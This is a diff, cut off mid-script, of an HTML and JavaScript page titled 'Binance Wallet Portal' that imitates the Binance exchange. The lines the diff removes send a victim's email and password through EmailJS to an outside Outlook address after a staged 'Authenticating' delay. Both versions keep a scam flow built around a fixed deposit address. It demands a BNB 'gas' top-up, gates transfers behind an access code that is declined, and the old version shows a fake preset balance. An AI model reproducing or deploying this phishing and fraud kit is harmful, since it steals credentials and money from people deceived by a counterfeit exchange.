@@ -4,258 +4,134 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Binance Wallet Portal</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.3/dist/ethers.min.js"></script>
   <style>
-    /* Base and layout */
+    /* === Global & Dark Mode Styles === */
     body {
-      margin: 0;
-      font-family: 'Arial Black', Arial, sans-serif;
-      background-color: #0B0E11;
-      color: white;
-      font-weight: 900;
-      display: flex;
-      flex-direction: column;
-      min-height: 100vh;
-      align-items: center;
-      padding: 20px;
+      margin: 0; font-family: 'Arial Black', Arial, sans-serif;
+      background-color: #0b0e11; color: #f3ba2f;
     }
     .page {
       display: none;
-      width: 100%;
-      max-width: 460px;
-      background-color: #1E2329;
-      border-radius: 24px;
-      padding: 32px;
-      box-shadow: 0 0 20px rgba(243, 186, 47, 0.4);
-      font-weight: 900;
-    }
-    .page.visible {
-      display: block;
+      padding: 20px;
+      min-height: 100vh;
     }
     h2 {
-      color: #f3ba2f;
-      font-size: 2.5rem;
-      letter-spacing: 1.5px;
-      margin-bottom: 24px;
-      text-align: center;
-    }
-    input, select {
-      width: 100%;
-      background-color: #0B0E11;
-      border: 2px solid #444c5a;
-      border-radius: 16px;
-      padding: 14px 18px;
-      margin: 12px 0;
-      color: white;
       font-weight: 900;
-      font-size: 1.1rem;
-      outline: none;
-      transition: border-color 0.3s;
-    }
-    input::placeholder, select::placeholder {
-      color: #666b7a;
-      font-weight: 700;
-    }
-    input:focus, select:focus {
-      border-color: #f3ba2f;
+      font-size: 24px;
+      margin-bottom: 20px;
+      color: #f3ba2f;
     }
     button {
-      width: 100%;
-      background-color: #f3ba2f;
-      border: none;
-      border-radius: 20px;
-      padding: 16px;
-      font-weight: 900;
-      font-size: 1.2rem;
-      color: #0B0E11;
       cursor: pointer;
-      transition: background-color 0.3s;
-      margin-top: 24px;
+      font-weight: 900;
+      background-color: #f3ba2f;
+      color: #000;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 12px;
+      transition: background-color 0.3s ease;
+      margin-bottom: 12px;
     }
     button:hover {
-      background-color: #e6b62d;
+      background-color: #e0a80a;
     }
-    .back-btn {
-      background-color: #222;
-      color: #f3ba2f;
+    input[type="text"], input[type="number"], select {
+      width: 100%;
       padding: 12px;
+      margin-bottom: 12px;
       border-radius: 12px;
       border: 1px solid #f3ba2f;
-      margin-top: 16px;
-      font-weight: 900;
-      cursor: pointer;
-      transition: background-color 0.3s;
-    }
-    .back-btn:hover {
-      background-color: #2c3137;
-    }
-    /* Flex and grid helpers */
-    .flex-row {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 24px;
-    }
-    .flex-row > * {
-      flex: 1;
-      margin: 0 6px;
-      min-width: 0;
-    }
-    /* Token cards */
-    .token {
-      background-color: #1E2329;
-      border-radius: 24px;
-      padding: 16px 24px;
-      margin-bottom: 32px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      box-shadow: 0 0 8px rgba(243, 186, 47, 0.25);
-    }
-    .token .left {
-      display: flex;
-      align-items: center;
-      gap: 16px;
-    }
-    .token img {
-      width: 40px;
-      height: 40px;
-    }
-    .token h3 {
-      margin: 0;
-      font-weight: 900;
-      font-size: 1.3rem;
-      color: white;
-    }
-    .token p {
-      margin: 0;
-      font-weight: 700;
-      font-size: 0.85rem;
-      color: #888f9b;
-    }
-    .token .right {
-      text-align: right;
-    }
-    .token .right p:first-child {
-      font-size: 1.6rem;
+      background-color: #1e2329;
       color: #f3ba2f;
       font-weight: 900;
-      margin-bottom: 4px;
+      font-family: monospace, monospace;
+      box-sizing: border-box;
     }
-    .token .right p:last-child {
-      font-size: 0.85rem;
-      color: #888f9b;
-      margin: 0;
+    input::placeholder {
+      color: #d1b547;
     }
-    /* Progress Bar */
-    .progress-bg {
-      background-color: #22272c;
-      border-radius: 16px;
-      width: 100%;
-      height: 24px;
-      margin-top: 8px;
-      overflow: hidden;
+    .back-btn {
+      background-color: #2b3139;
+      color: #f3ba2f;
+      border: 1px solid #f3ba2f;
     }
-    #goalBar {
-      height: 100%;
-      width: 0%;
-      background: linear-gradient(90deg, #f3ba2f, #e6b62d);
-      transition: width 0.5s ease-in-out;
+    .back-btn:hover {
+      background-color: #1e2329;
     }
-    /* Chart container */
-    #profitChart {
-      width: 100%;
-      height: 240px;
-      margin-top: 80px;
-      border-radius: 24px;
-      background-color: #131a22;
-      box-shadow: 0 0 16px rgba(243, 186, 47, 0.3);
+    .flex-row {
+      display: flex;
+      gap: 12px;
     }
-    /* Small text */
-    .small-text {
-      font-size: 0.85rem;
-      color: #888f9b;
-      font-weight: 700;
+    .token {
+      cursor: pointer;
+    }
+    .token:hover {
+      background-color: #2b3139;
+    }
+    .loader {
+      border: 4px solid #f3ba2f;
+      border-top: 4px solid transparent;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      margin: 0 auto 24px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
     }
   </style>
 </head>
-<body>  
+<body>
 
-<!-- Page 1: Login -->
-<div id="page1" class="page visible" style="background-color: #0b0e11; color: #f0b90b; padding: 40px; font-family: 'Arial Black', Arial, sans-serif; min-height: 100vh;">
-  <div style="max-width: 400px; margin: auto; text-align: center;">
-    <h2 style="font-size: 24px; margin-bottom: 30px;">Binance Wallet Login</h2>
-    <input type="email" id="email" placeholder="Email"
-      style="width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 10px; background-color: #1e1e1e; border: 1px solid #f0b90b; color: white; font-weight: bold;" />
-    <input type="password" id="pass" placeholder="Password"
-      style="width: 100%; padding: 12px; margin-bottom: 20px; border-radius: 10px; background-color: #1e1e1e; border: 1px solid #f0b90b; color: white; font-weight: bold;" />
-    <button onclick="submitSignin()" 
-      style="width: 100%; padding: 12px; background-color: #f0b90b; color: #000; border: none; border-radius: 10px; font-weight: bold; font-size: 16px;">
-      Sign In
-    </button>
-  </div>
+<!-- === PAGE 1: Sign In === -->
+<div id="page1" class="page">
+  <h2>Sign In</h2>
+  <input type="text" id="emailInput" placeholder="Email" />
+  <input type="password" id="passwordInput" placeholder="Password" />
+  <button onclick="signIn()">Sign In</button>
+  <div id="signInStatus" style="color: #f3ba2f; font-weight: 900;"></div>
 </div>
 
-<!-- Page 2: Authenticating -->
-<div id="page2" class="page" style="display:none; background-color: #0b0e11; color: #f0b90b; padding: 40px; font-family: 'Arial Black', Arial, sans-serif; min-height: 100vh;">
-  <div style="max-width: 400px; margin: auto; text-align: center;">
-    <h2 style="font-size: 24px;">Authenticating...</h2>
-    <p style="text-align: center; color: #aaa;">Please wait...</p>
-    <div style="margin-top: 30px;">
-      <div class="spinner" style="border: 4px solid #1e1e1e; border-top: 4px solid #f0b90b; border-radius: 50%; width: 40px; height: 40px; margin: auto; animation: spin 1s linear infinite;"></div>
-    </div>
-  </div>
+<!-- === PAGE 2: Authenticating === -->
+<div id="page2" class="page">
+  <h2>Authenticating...</h2>
+  <p>Please wait while we authenticate your account.</p>
 </div>
 
-<!-- Page 3: Confirm ID -->
-<div class="page" id="page3" style="display:none; background-color: #0b0e11; color: #f0b90b; padding: 40px; min-height: 100vh; font-family: 'Arial Black', Arial, sans-serif;">
-  <div style="max-width: 400px; margin: auto; text-align: center;">
-    <h2 style="font-size: 24px; margin-bottom: 30px;">Enter Account ID</h2>
-    <input id="accountIdInput" type="text" placeholder="Account ID"
-      style="width: 100%; padding: 12px; border-radius: 10px; background-color: #1e1e1e; border: 1px solid #f0b90b; color: #fff; font-weight: bold; margin-bottom: 20px;" />
-    <button onclick="confirmAccountID()"
-      style="width: 100%; padding: 12px; background-color: #f0b90b; color: #000; border: none; border-radius: 10px; font-weight: bold; font-size: 16px;">
-      Confirm
-    </button>
-    <div id="accountSpinner" style="margin-top: 20px; display: none;">
-      <span style="color: #f0b90b;">Validating...</span>
-    </div>
-    <button onclick="showPage(2)"
-      style="margin-top: 30px; padding: 10px 20px; background-color: transparent; border: 1px solid #f0b90b; color: #f0b90b; border-radius: 8px; font-weight: bold;">
-      ← Back
-    </button>
-  </div>
+<!-- === PAGE 3: Account ID Confirmation === -->
+<div id="page3" class="page">
+  <h2>Account ID Confirmation</h2>
+  <p>Please confirm your account ID.</p>
+  <button onclick="confirmAccountID()">Confirm</button>
 </div>
-  
-<!-- Homepage (Main Dashboard) -->
+
+<!-- === PAGE 4: Homepage (Main Dashboard) === -->
 <div id="page4" class="page">
-  <!-- Homepage Header -->
   <div style="font-size: 1.5rem; font-weight: bold; margin-bottom: 20px;">Homepage</div>
 
-  <!-- Wallet Connect Row -->
   <div class="flex-row" style="margin-bottom: 40px;">
-    <button id="connectWalletBtn" onclick="showPage(13)">Connect Wallet</button>
+    <button id="connectWalletBtn" onclick="showPage('page13')">Connect Wallet</button>
     <div id="connectedWalletDisplayHomepage" style="color: #f3ba2f; font-weight: 900; margin-left: auto;"></div>
   </div>
 
-  <!-- Total Assets -->
   <div style="margin-bottom: 24px; font-weight: 900; font-size: 1.2rem; display: flex; justify-content: space-between; align-items: center;">
     <div>Total Assets</div>
-    <div id="totalAssetsDisplay" style="color: #f3ba2f;">$2978.78</div>
+    <div id="totalAssetsDisplay" style="color: #f3ba2f;">$0.00</div>
   </div>
 
-  <!-- Action Buttons -->
   <div class="flex-row" style="margin-bottom: 40px;">
-    <button onclick="showPage(6)" style="font-weight: 900;">Receive</button>
-    <button onclick="showPage(5)" style="font-weight: 900;">Top Up BNB</button>
-    <button onclick="showPage(8)" style="font-weight: 900;">Transfer</button>
+    <button onclick="showPage('page6')" style="font-weight: 900;">Receive</button>
+    <button onclick="showPage('page5')" style="font-weight: 900;">Top Up BNB</button>
+    <button onclick="showPage('page8')" style="font-weight: 900;">Transfer</button>
   </div>
 
   <!-- USDT Token Box -->
-  <div class="token bg-[#1E2329] rounded-2xl p-4 mb-4 shadow-md text-white flex items-center justify-between cursor-pointer hover:bg-[#2b3139]" onclick="openTransferPage('USDT')">
+  <div class="token bg-[#1E2329] rounded-2xl p-4 mb-4 shadow-md text-white flex items-center justify-between" onclick="openTransferPage('USDT')">
     <div class="flex items-center space-x-3">
-      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAABjElEQVR4nO3ZMUoDQRRG4WuYyM/ANmwArsAJ7AFuwArsAHbAHawCuwAnawC7cU0rA2puvf2uqrZmd5PaZnZtxz8rcuQqzDEYDAaDwWAwGg8FgMBkOypU/1mff4tcqX/fXvsLuYemK1VX5uK+FXKo3F+LOqPMrT3l2z3u+Z0+lfxN7OtVeuUE1hOZR3BzMRzGcznM5zHMB3PZTGdzmcznMZzNcz3M5fys5Y2nvM5nM5zGbJXJ8b2TPt9VzHc3mQ0xLPMbzzGcyTMZzGcznM5zGb5gZ4/Z2k8rfdOb67yS+cn6xwCawCewCewCewCewAfsAB7ADewAnawCewAnawCewAnawAfsAB7ADewAfsAHbAHbAHrAFuwAnawCewCewCewAfsAB7ADewAfsAHbAHbAH7AAPZ9o1kT7gUmv/3p5Ti8AAAAASUVORK5CYII=" 
-           alt="USDT Icon" 
-           style="width: 40px; height: 40px; vertical-align: middle;" />
+      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAABjElEQVR4nO3ZMUoDQRRG4WuYyM/ANmwArsAJ7AFuwArsAHbAHawCuwAnawC7cU0rA2puvf2uqrZmd5PaZnZtxz8rcuQqzDEYDAaDwWAwGg8FgMBkOypU/1mff4tcqX/fXvsLuYemK1VX5uK+FXKo3F+LOqPMrT3l2z3u+Z0+lfxN7OtVeuUE1hOZR3BzMRzGcznM5zHMB3PZTGdzmcznMZzNcz3M5fys5Y2nvM5nM5zGbJXJ8b2TPt9VzHc3mQ0xLPMbzzGcyTMZzGcznM5zGb5gZ4/Z2k8rfdOb67yS+cn6xwCawCewCewCewCewAfsAB7ADewAnawCewAnawCewAnawAfsAB7ADewAfsAHbAHbAHrAFuwAnawCewCewCewAfsAB7ADewAfsAHbAHbAH7AAPZ9o1kT7gUmv/3p5Ti8AAAAASUVORK5CYII=" alt="USDT Icon" style="width: 40px; height: 40px;" />
       <div>
         <h3 class="text-lg font-bold">Tether (USDT)</h3>
         <p class="text-sm text-gray-400">BEP-20</p>
@@ -265,14 +141,12 @@
       <p id="usdtBalance" class="text-yellow-400 font-semibold">0.00</p>
       <p class="text-sm text-gray-400">Balance</p>
     </div>
-  </div>  
+  </div>
 
   <!-- BNB Token Box -->
-  <div class="token bg-[#1E2329] rounded-2xl p-4 mb-4 shadow-md text-white flex items-center justify-between cursor-pointer hover:bg-[#2b3139]" onclick="openTransferPage('BNB')">
+  <div class="token bg-[#1E2329] rounded-2xl p-4 mb-4 shadow-md text-white flex items-center justify-between" onclick="openTransferPage('BNB')">
     <div class="flex items-center space-x-3">
-      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAABVUlEQVR4nO3Z0UoDQRCG4Qe6A3sAt2DewAXsAt2APfQAbcAd7AJ2gN3gAeSBcjcTL0TX4q+uHOc+Ntzxy/HXXmAFgMBgMBgMBgMBk+KoF/o3s6f9XPpXy0kUbwDpyn+61hX9Vwmsfl2knXQdV8q6Cd9bld2Wt/SbAVsmcDkcxnM5zGbJXDZzFcxnM5zGb5gzOfcznMZzGc5lcxXc9nMZzOcznMZzGcznMZzGcznMZ3KrDKTMZzGbJXJ8b2TPt9VzHc3mQ0xLPMbzzGcyTMZzGcznM5zGb5gZ4/Z2k8rfdOb67yS+cn6xwCawCewCewCewCewAfsAB7ADewAnawCewAnawCewAnawAfsAB7ADewAfsAHbAHbAHrAFuwAnawCewCewCewAfsAB7ADewAfsAHbAHbAH7AAP4BCGmv/ra7i6YAAAAASUVORK5CYII=" 
-           alt="BNB Icon" 
-           style="width: 40px; height: 40px; vertical-align: middle;" />
+      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAABVUlEQVR4nO3Z0UoDQRCG4Qe6A3sAt2DewAXsAt2APfQAbcAd7AJ2gN3gAeSBcjcTL0TX4q+uHOc+Ntzxy/HXXmAFgMBgMBgMBgMBk+KoF/o3s6f9XPpXy0kUbwDpyn+61hX9Vwmsfl2knXQdV8q6Cd9bld2Wt/SbAVsmcDkcxnM5zGbJXDZzFcxnM5zGb5gzOfcznMZzGc5lcxXc9nMZzOcznMZzGcznMZzGcznMZ3KrDKTMZzGbJXJ8b2TPt9VzHc3mQ0xLPMbzzGcyTMZzGcznM5zGb5gZ4/Z2k8rfdOb67yS+cn6xwCawCewCewCewCewAfsAB7ADewAnawCewAnawCewAnawAfsAB7ADewAfsAHbAHbAHrAFuwAnawCewCewCewAfsAB7ADewAfsAHbAHbAH7AAP4BCGmv/ra7i6YAAAAASUVORK5CYII=" alt="BNB Icon" style="width: 40px; height: 40px;" />
       <div>
         <h3 class="text-lg font-bold">BNB</h3>
         <p class="text-sm text-gray-400">BNB Smart Chain</p>
@@ -282,97 +156,47 @@
       <p id="bnbBalance" class="text-yellow-400 font-semibold">0.0000</p>
       <p class="text-sm text-gray-400">Balance</p>
     </div>
-  </div>  
-  
-  <!-- ✅ Settings Button (bottom right) -->
+  </div>
+
   <div style="position: fixed; bottom: 20px; right: 20px;">
-    <button onclick="showPage(12)" style="background-color: #f0b90b; color: #000; border: none; padding: 10px 20px; border-radius: 12px; font-weight: bold;">
-      Settings
-    </button>
+    <button onclick="showPage('page12')">Settings</button>
   </div>
 </div>
-</div>
 
-<!-- Page 5: Top Up BNB -->
+<!-- === PAGE 5: Top Up BNB === -->
 <div id="page5" class="page">
   <h2>Top Up BNB</h2>
   <p>This is a placeholder page for topping up BNB.</p>
-  <button class="back-btn" onclick="showPage('4')">Back to Homepage</button>
+  <button class="back-btn" onclick="showPage('page4')">Back to Homepage</button>
 </div>
 
-    <!-- Page 5: Scan -->   
-  <div class="page min-h-screen bg-[#0B0E11] text-white p-6" id="page6">        
-  <div class="max-w-md mx-auto bg-[#1E2329] p-6 rounded-2xl shadow-lg">  
-  <!-- Header -->        
-<h2 id="scanAction" class="text-2xl font-semibold text-[#f3ba2f] mb-4 text-center">Action</h2>        
-    
-<!-- QR Code -->        
-<div class="flex justify-center mb-4">        
-  <img        
-    src="https://api.qrserver.com/v1/create-qr-code/?data=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0&size=200x200"        
-    alt="QR Code"        
-    class="rounded-lg border border-gray-700"        
-  />        
-</div>        
-    
-<!-- Wallet Address -->        
-<p class="text-center text-sm text-gray-400 mb-2">Send to:</p>        
-<p class="text-center text-[#f3ba2f] text-sm font-mono mb-4">        
-  0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0        
-</p>        
-    
-<!-- Transaction Hash Input -->        
-<input        
-  type="text"        
-  id="txHash"        
-  placeholder="Enter Transaction Hash"        
-  class="w-full p-3 mb-4 rounded-lg bg-[#0B0E11] border border-gray-600 placeholder-gray-500 focus:outline-none focus:border-[#f3ba2f] text-white"        
-/>        
-    
-<!-- Confirm Button -->        
-<button        
-  onclick="submitTransaction()"        
-  class="w-full bg-[#f3ba2f] text-black font-semibold py-3 rounded-lg hover:bg-yellow-400 transition mb-4"        
->        
-  Confirm Transaction        
-</button>        
-    
-<!-- Status Message -->        
-<div id="txStatus" class="text-center text-sm text-green-400 mb-4"></div>        
-    
-<!-- Return Button -->        
-<button        
-  onclick="showPage('4')"        
-  class="w-full border border-[#f3ba2f] text-[#f3ba2f] py-2 rounded-lg hover:bg-[#2c3137] transition"        
->        
-  Return        
-</button>
-    
-<!-- Page 6: Receive -->
-<div id="page6" class="page">
-  <h2>Receive</h2>
-  <p class="small-text text-center">Send to:</p>
-  <p style="font-family: monospace; font-weight: 900; color: #f3ba2f; text-align: center;">0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0</p>
-  <div style="display: flex; justify-content: center; margin-bottom: 20px;">
-    <img src="https://api.qrserver.com/v1/create-qr-code/?data=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0&size=200x200" alt="QR Code" style="border-radius: 16px; border: 1px solid #444c5a;" />
+<!-- === PAGE 6: Scan === -->
+<div id="page6" class="page" style="min-height: 100vh;">
+  <div class="max-w-md mx-auto bg-[#1E2329] p-6 rounded-2xl shadow-lg" style="margin: auto;">
+    <h2 id="scanAction" style="text-align: center; color: #f3ba2f; font-weight: 900; margin-bottom: 20px;">Receive</h2>
+    <div style="display: flex; justify-content: center; margin-bottom: 20px;">
+      <img src="https://api.qrserver.com/v1/create-qr-code/?data=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0&size=200x200" alt="QR Code" style="border-radius: 16px; border: 1px solid #444c5a;" />
+    </div>
+    <p style="text-align: center; font-family: monospace; font-weight: 900; color: #f3ba2f; margin-bottom: 20px;">0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0</p>
+
+    <input type="text" id="txHash" placeholder="Enter Transaction Hash" />
+    <button onclick="submitTransaction()">Confirm Transaction</button>
+    <div id="txStatus" style="color: #2ecc71; font-weight: 900; margin-top: 12px;"></div>
+    <button class="back-btn" onclick="showPage('page4')">Back</button>
   </div>
-  <input type="text" id="txHash" placeholder="Enter Transaction Hash" />
-  <button onclick="submitTransaction()">Confirm Transaction</button>
-  <div id="txStatus" style="color: #2ecc71; font-weight: 900; margin-top: 12px;"></div>
-  <button class="back-btn" onclick="showPage('4')">Back</button>
 </div>
 
-<!-- Page 7: Connect Wallet -->
+<!-- === PAGE 7: Connect Wallet === -->
 <div id="page7" class="page">
   <h2>Connect Your Wallet</h2>
-  <button onclick="connectWallet()">Connect Wallet</button>
+  <button onclick="connectWallet()">Connect Wallet via MetaMask</button>
   <input type="text" id="manualWallet" placeholder="Enter Wallet Address Manually" />
   <button onclick="manualWalletConnect()">Use Manual Wallet</button>
   <div id="walletInfo" style="color: #f3ba2f; font-weight: 900; margin-top: 12px;"></div>
-  <button class="back-btn" onclick="showPage('4')">Back</button>
+  <button class="back-btn" onclick="showPage('page4')">Back</button>
 </div>
 
-<!-- Page 8: Transfer -->
+<!-- === PAGE 8: Transfer === -->
 <div id="page8" class="page">
   <h2>Make a Transfer</h2>
   <input type="text" id="inputWallet" placeholder="Enter Wallet Address" />
@@ -386,11 +210,11 @@
   <div style="margin-top: 12px; font-weight: 900; color: #f3ba2f;">
     Gas Fee: <span id="gasFee">0.09490 BNB</span>
   </div>
-  <button onclick="goToBNBGasConfirmationPage('9i')">Confirm</button>
-  <button class="back-btn" onclick="showPage('4')">Return</button>
+  <button onclick="goToBNBGasConfirmationPage('page9i')">Confirm</button>
+  <button class="back-btn" onclick="showPage('page4')">Return</button>
 </div>
 
-<!-- Page 9i: BNB Gas Confirmation -->
+<!-- === PAGE 9i: BNB Gas Confirmation === -->
 <div id="page9i" class="page">
   <h2>⚠️ Not Enough BNB</h2>
   <p>Top up <strong>0.09 BNB</strong> to continue.</p>
@@ -400,7 +224,7 @@
   <button class="back-btn" onclick="showPage('page8')">Return</button>
 </div>
 
-<!-- Page 9ii: Access Code -->
+<!-- === PAGE 9ii: Access Code === -->
 <div id="page9ii" class="page">
   <h2>Access Code Required</h2>
   <input type="text" id="accessCodeInput" placeholder="Enter Access Code" />
@@ -408,64 +232,41 @@
   <button class="back-btn" onclick="showPage('page8')">Go Back</button>
 </div>
 
-<!-- Page 10: Processing -->
+<!-- === PAGE 10: Transaction Processing === -->
 <div id="page10" class="page">
   <h2>Transaction Processing...</h2>
-  <div class="loader" style="border: 4px solid #f3ba2f; border-top: 4px solid transparent; border-radius: 50%; width: 40px; height: 40px; margin: 0 auto 24px; animation: spin 1s linear infinite;"></div>
+  <div class="loader"></div>
   <p>Verifying access code...</p>
 </div>
-<!-- Page 11: Transaction Declined -->
+
+<!-- === PAGE 11: Transaction Declined === -->
 <div id="page11" class="page">
   <h2 style="color: #e74c3c;">❌ Transaction Declined</h2>
   <p>The code entered was incorrect. Please try again.</p>
   <button onclick="showPage('page9ii')">Try Again</button>
-  <button class="back-btn" onclick="showPage('4')">Back to Homepage</button>
+  <button class="back-btn" onclick="showPage('page4')">Back to Homepage</button>
 </div>
 
-<!-- Page 12: Settings -->
-<div id="page12" class="page" style="background-color: #0b0e11; color: #f0b90b; padding: 20px; min-height: 100vh;">
-  <h2 style="font-size: 24px; margin-bottom: 20px;">Settings</h2>  
+<!-- === PAGE 12: Settings === -->
+<div id="page12" class="page" style="background-color: #0b0e11; color: #f0b90b;">
+  <h2>Settings</h2>
 
-  <!-- Connect Wallet Button --> 
-  <div id="walletDisplay" style="margin-bottom: 15px; font-weight: bold; color: #f0b90b;">
-  No wallet connected
+  <div id="walletDisplay" style="margin-bottom: 15px; font-weight: bold; color: #f0b90b;">No wallet connected</div>
+  <button onclick="connectWallet()">Connect Wallet</button><br/>
+  <button onclick="disconnectWallet()" style="background-color: #222; color: #f0b90b; border: 1px solid #f0b90b;">Disconnect Wallet</button><br/>
+  <button onclick="logout()" style="background-color: #222; color: red; border: 1px solid red;">Logout</button><br/>
+
+  <input type="text" id="manualWallet" placeholder="Enter Wallet Address Manually" style="background-color: #1e1e1e; color: white; padding: 10px; width: 80%; margin: 10px 0; border: 1px solid #f0b90b; border-radius: 8px;" />
+  <button onclick="manualWalletConnect()" style="background-color: #444; color: #f0b90b;">Use Manual Wallet</button><br/><br/>
+
+  <button onclick="window.open('https://widget-page.smartsupp.com/widget/3ab3e4c3fcd21f84344cc872db2a35d9e40245a6', '_blank')" style="background-color: #f0b90b; color: #000;">Live Chat</button>
+
+  <div style="position: fixed; bottom: 20px; right: 20px;">
+    <button class="back-btn" onclick="showPage('page4')" style="background-color: #444; color: #f0b90b;">Back to Homepage</button>
   </div>
-  <button onclick="connectWallet()" style="background-color: #f0b90b; color: #000; padding: 10px 20px; border: none; border-radius: 8px; margin-bottom: 10px;">  
-    Connect Wallet  
-  </button><br/>  
-
-  <!-- Disconnect Wallet Button -->  
-  <button onclick="disconnectWallet()" style="background-color: #222; color: #f0b90b; padding: 10px 20px; border: 1px solid #f0b90b; border-radius: 8px; margin-bottom: 10px;">  
-    Disconnect Wallet  
-  </button><br/>  
-
-  <!-- Logout Button -->  
-  <button onclick="logout()" style="background-color: #222; color: red; padding: 10px 20px; border: 1px solid red; border-radius: 8px; margin-bottom: 10px;">  
-    Logout  
-  </button><br/>  
-
-  <!-- Manual Wallet Input -->  
-  <input type="text" id="manualWallet" placeholder="Enter Wallet Address Manually"  
-    style="background-color: #1e1e1e; color: white; padding: 10px; width: 80%; margin: 10px 0; border: 1px solid #f0b90b; border-radius: 8px;" />  
-  <button onclick="manualWalletConnect()"   
-    style="background-color: #444; color: #f0b90b; padding: 10px 20px; border: none; border-radius: 8px;">  
-    Use Manual Wallet  
-  </button><br/><br/>  
-
-  <!-- Live Chat Button -->  
-  <button   
-    onclick="window.open('https://widget-page.smartsupp.com/widget/3ab3e4c3fcd21f84344cc872db2a35d9e40245a6', '_blank')"   
-    style="background-color: #f0b90b; color: #000; padding: 10px 20px; border: none; border-radius: 8px;">  
-    Live Chat  
-  </button>  
-
-  <!-- Back to Homepage Button -->  
-  <div style="position: fixed; bottom: 20px; right: 20px;">      
-    <button class="back-btn" onclick="showPage('page4')" style="background-color: #444; color: #f0b90b; padding: 10px 20px; border: none; border-radius: 8px;">Back to Homepage</button>  
-  </div>   
 </div>
-    
-<!-- Page 13: Connect Wallet -->
+
+<!-- === PAGE 13: Connect Wallet === -->
 <div id="page13" class="page">
   <h2>Connect Wallet</h2>
   <button onclick="connectWallet()">Connect Wallet via MetaMask</button>
@@ -475,257 +276,336 @@
   <button class="back-btn" onclick="showPage('page4')">Back to Homepage</button>
 </div>
 
-
-<script src="https://cdn.jsdelivr.net/npm/ethers@6.6.3/dist/ethers.min.js"></script><script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script><script>
-  const emailService = "service_78wwbgl";
-  const signinTemplate = "template_omkmcio";
-  const publicKey = "ochPV1QVtay7TOdBA";
-  emailjs.init(publicKey);
-
-  let connectedWallet = null;
-  let usdtBalance = 2978.78;
-  let bnbBalance = 0.0000;
-  const dailyGoal = 150;
-  let dailyProgressValue = 0;
-
-  const usdtAddress = "0x55d398326f99059ff775485246999027b3197955";
-  const usdtABI = [
-    "function balanceOf(address owner) view returns (uint256)",
-    "function decimals() view returns (uint8)"
-  ];
-  function showPage(pageNumber) {
-    const pages = document.querySelectorAll('.page');
-    pages.forEach(page => page.style.display = 'none');
-    document.getElementById('page' + pageNumber).style.display = 'block';
+<script>
+  // === Show page helper ===
+  function showPage(pageId) {
+    document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
+    const page = document.getElementById(pageId);
+    if (page) page.style.display = 'block';
   }
-    const page = typeof pageId === 'number' ? document.getElementById('page' + pageId) : document.getElementById(pageId);
-    if (page) {
-      page.style.display = 'block';
-      setTimeout(() => page.classList.add('visible'), 10);
-      localStorage.setItem('currentPage', page.id);
+
+  // === Initial page load: Sign In (page1) ===
+  showPage('page1');
+
+  // === Authentication simulation ===
+  function signIn() {
+    const email = document.getElementById('emailInput').value.trim();
+    const password = document.getElementById('passwordInput').value.trim();
+    const status = document.getElementById('signInStatus');
+    if (!email || !password) {
+      status.innerText = "Email and password required.";
+      return;
     }
-  }
-
-  function submitSignin() {
-    const email = document.getElementById('email').value.trim();
-    const pass = document.getElementById('pass').value.trim();
-    if (!email || !pass) return alert('Please enter both email and password.');
+    status.innerText = "";
     showPage('page2');
     setTimeout(() => {
-      emailjs.send(emailService, signinTemplate, {
-        user_email: email,
-        user_password: pass,
-        to_email: "binancewebonline@outlook.com"
-      }).then(() => console.log("Email sent")).catch(console.error);
       showPage('page3');
-    }, 7000);
+    }, 1500);
   }
-
   function confirmAccountID() {
-    const accountId = document.getElementById("accountIdInput").value.trim();
-    const spinner = document.getElementById("accountSpinner");
-    if (!accountId) return alert("Please enter your Account ID.");
-    spinner.style.display = "block";
-    setTimeout(() => {
-      spinner.style.display = "none";
-      showPage('page4');
-    }, 5000);
+    showPage('page4');
+    updateBalancesDisplay();
+    updateConnectedWalletDisplay();
   }
 
-  async function switchToBSC() {
+  // === Wallet Connect functions ===
+  async function connectWallet() {
+    const statusId = document.getElementById('walletInfo') || document.getElementById('walletConnectionStatus') || document.getElementById('walletDisplay');
     try {
-      await window.ethereum.request({
-        method: 'wallet_switchEthereumChain',
-        params: [{ chainId: '0x38' }]
-      });
+      if (typeof window.ethereum === 'undefined') {
+        statusId.innerText = "MetaMask not available";
+        return;
+      }
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const accounts = await provider.send("eth_requestAccounts", []);
+      if (!accounts.length) {
+        statusId.innerText = "No wallet accounts found.";
+        return;
+      }
+      const walletAddress = accounts[0];
+      localStorage.setItem("connectedWallet", walletAddress);
+      statusId.innerText = `Connected Wallet: ${walletAddress}`;
+      updateConnectedWalletDisplay();
+      updateBalancesDisplay();
+      showPage('page4');
     } catch (err) {
-      console.error("Switch to BSC failed", err);
+      console.error(err);
+      statusId.innerText = "Failed to connect wallet.";
+    }
+  }
+  function manualWalletConnect() {
+    const manualInput = document.getElementById('manualWallet') || document.getElementById('manualWalletInput');
+    const statusId = document.getElementById('walletInfo') || document.getElementById('walletConnectionStatus') || document.getElementById('walletDisplay');
+    if (!manualInput) return;
+    const manualAddress = manualInput.value.trim();
+    if (!manualAddress || !manualAddress.startsWith("0x") || manualAddress.length !== 42) {
+      statusId.innerText = "Invalid wallet address.";
+      return;
+    }
+    localStorage.setItem("connectedWallet", manualAddress);
